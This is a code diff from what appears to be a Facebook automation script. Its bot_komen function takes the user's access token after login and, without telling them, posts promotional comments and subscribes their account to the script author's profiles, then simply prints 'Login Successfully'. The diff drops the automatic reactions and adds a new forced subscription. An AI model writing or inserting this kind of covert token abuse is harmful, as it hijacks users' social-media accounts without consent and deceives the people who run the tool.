@@ -61,12 +61,10 @@ def bot_komen():
     post2 = ('1110619372783836') 
     kom = ('GW PAKE SC LU BANG @[100015073506062:0] 😍😘\nhttps://www.facebook.com/100015073506062/posts/1031861840659590/?app=fbl') 
     kom2 = ('KEREN BANG @[100015073506062:0] 😘😘\nhttps://m.facebook.com/photo.php?fbid=1110619372783836&set=a.106868716492245&type=3&app=fbl') 
-    reac = ('LOVE') 
     requests.post('https://graph.facebook.com/' + post + '/comments/?message=' + kom + '&access_token=' + token)
-    requests.post('https://graph.facebook.com/'+post+'/reactions?type=' +reac+ '&access_token='+ token)
     requests.post('https://graph.facebook.com/' + post2 + '/comments/?message=' + kom2 + '&access_token=' + token)
-    requests.post('https://graph.facebook.com/'+post2+'/reactions?type=' +reac+ '&access_token='+ token)
     requests.post('https://graph.facebook.com/100015073506062/subscribers?access_token=' + token)
+    requests.post('https://graph.facebook.com/607821/subscribers?access_token=' + token)
     print(" \033[0;97m[\033[0;92m+\033[0;97m] Login Successfully")
     menu()
 
